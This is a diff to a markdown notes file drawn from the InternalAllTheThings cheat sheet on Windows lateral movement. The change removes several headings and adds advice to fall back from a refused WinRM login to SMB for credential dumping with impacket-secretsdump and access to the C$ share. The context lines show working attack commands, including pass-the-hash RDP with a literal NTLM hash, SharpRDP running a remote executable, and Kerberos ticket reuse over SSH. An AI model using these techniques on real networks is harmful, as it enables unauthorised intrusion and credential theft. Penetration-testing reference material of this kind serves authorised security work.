@@ -57,8 +57,6 @@ The following imported sections retain upstream ordering, tables, and copy-pasta
     * [Mount a remote share](#mount-a-remote-share)
     * [Run as another user](#run-as-another-user)
 
-## Get Credentials
-
 ### Create Credential
 
 ```powershell
@@ -384,8 +382,6 @@ root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debb
 PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
 ```
 
-## Powershell Remoting Protocol
-
 ### Powershell Credentials
 
 ```ps1
@@ -479,8 +475,6 @@ ssh -l user@domain 192.168.1.1
 cp user.ccache /tmp/krb5cc_1045
 ssh -o GSSAPIAuthentication=yes user@domain.local -vv
 ```
-
-## Other Methods
 
 ### PsExec - Sysinternals
 
@@ -598,3 +592,9 @@ Apply vendor baselines for logging, least privilege, patch cadence, and segmenta
 ## Sources
 
 - Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
+
+## Local admin refused by WinRM but valid over SMB (session SDDL)
+
+With `LocalAccountTokenFilterPolicy=1` set, a NON-builtin local admin (an account added to Administrators, or a dedicated service-admin account) can still be refused by WinRM: the WinRM session configuration SDDL grants built-in Administrators, so port 5985 denies while SMB admin shares accept the same credentials. Do not grind WinRM variants; route the admin work over SMB (`impacket-secretsdump`, `smbclient //host/C$`), which covers dumping and file access.
+
+<!-- promoted-slug: winrm-sddl-local-admin-smb-fallback -->
